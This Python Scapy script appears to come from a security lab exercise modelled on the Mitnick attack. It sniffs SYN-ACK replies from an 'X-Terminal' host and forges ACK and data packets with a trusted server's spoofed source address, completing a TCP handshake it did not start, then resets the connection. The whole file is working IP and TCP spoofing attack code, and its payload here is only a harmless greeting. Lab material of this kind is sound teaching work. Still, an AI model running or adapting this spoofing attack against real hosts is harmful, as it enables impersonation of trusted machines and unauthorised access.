#!/usr/bin/python3
from scapy.all import *
import time

x_ip      = "10.0.2.68"  # X-Terminal
x_port    = 9090         # Port number used by X-Terminal

srv_ip    = "10.0.2.69"  # The trusted server
srv_port  = 8000         # Port number used by the trusted server

syn_seq   = 0x1000       # Initial sequence number

# Spoof the ACK to finish 3-way handshake initiated by the attacker
# We are only allowed to use the sequence number in the captured packet
def spoof(pkt):
    old_tcp = pkt[TCP]

    if old_tcp.flags == 'SA':
       # Spoof ACK to finish the handshake protocol
       ip =  IP( src   = srv_ip, 
                 dst   = x_ip)
       tcp = TCP(sport = srv_port, 
                 dport = x_port,
                 seq   = syn_seq + 1, 
                 ack   = old_tcp.seq + 1,
                 flags="A")
       data = 'Hello victim\n'
       print('  {}-->{} Spoofing ACK + Data'.format(tcp.sport, tcp.dport))
       send(ip/tcp/data, verbose=0)

       # Reset the connection after 2 seconds
       # This is not necessary. We did this, so we can repeat the attack.
       time.sleep(2)
       tcp.flags = "R"
       tcp.seq   = syn_seq + 1 + len(data)
       print('  {}-->{} Resetting connection'.format(tcp.sport, tcp.dport))
       send(ip/tcp, verbose=0)

f = 'tcp and src host {} and src port {} and dst host {} and dst port {}'
myFilter = f.format(x_ip, x_port, srv_ip, srv_port)
sniff(iface='br-b553588f8f96', filter=myFilter, prn=spoof)

